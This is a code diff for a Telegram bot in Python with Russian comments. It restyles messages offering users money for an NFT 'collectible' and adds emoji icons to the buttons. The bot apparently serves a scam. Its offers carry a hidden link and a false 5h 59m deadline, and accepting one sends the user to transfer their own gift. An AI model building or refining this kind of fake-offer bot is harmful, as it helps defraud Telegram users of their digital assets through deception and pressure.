@@ -17,6 +17,7 @@ last_message_id = None
 STAR_EMOJI_ID = "5323333018151045958"
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
+ENVELOPE_EMOJI_ID = "6019263620142078168" # <--- Твой ID конверта
 
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 
@@ -86,28 +87,28 @@ async def send_offer(message: Message):
 
     if lang == "ru":
         offer_text = (
-            f"<b>Пользователь {sender_name} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
-            f"<b>Предложение действует ещё 5ч 59м.</b>\n"
+            f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft_link}.</b>\n\n"
+            f"<i>Действует 5ч 59м.</i>\n"
             f"{hidden_link}"
         )
     else:
         offer_text = (
-            f"<b>User {sender_name} offers you {amount} {currency_display} for the gift {nft_link}.</b>\n\n"
-            f"<b>Offer expires in 5h 59m.</b>\n"
+            f"<b>{sender_name} offers you {amount} {currency_display} for the collectible {nft_link}.</b>\n\n"
+            f"<i>Expires in 5h 59m.</i>\n"
             f"{hidden_link}"
         )
 
-    # Кнопки с премиум-иконками (крестик и галочка)
+    # Кнопки с премиум-иконками
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
             text="Отклонить" if lang == "ru" else "Decline", 
             callback_data="decline",
-            icon_custom_emoji_id=CROSS_EMOJI_ID # <--- Крестик
+            icon_custom_emoji_id=CROSS_EMOJI_ID
         ),
         InlineKeyboardButton(
             text="Принять" if lang == "ru" else "Accept", 
             callback_data="accept_offer",
-            icon_custom_emoji_id=CHECK_EMOJI_ID # <--- Галочка
+            icon_custom_emoji_id=CHECK_EMOJI_ID
         )
     ]])
 
@@ -177,8 +178,13 @@ async def on_accept_offer(callback: CallbackQuery):
         btn_transfer = "Transfer"
         btn_how = "How to transfer?"
 
+    # Кнопка "Передать" с иконкой конверта
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=btn_transfer, url="tg://settings/my-profile/gifts")],
+        [InlineKeyboardButton(
+            text=btn_transfer, 
+            url="tg://settings/my-profile/gifts",
+            icon_custom_emoji_id=ENVELOPE_EMOJI_ID # <--- Иконка конверта
+        )],
         [InlineKeyboardButton(text=btn_how, callback_data="send_transfer")]
     ])
 
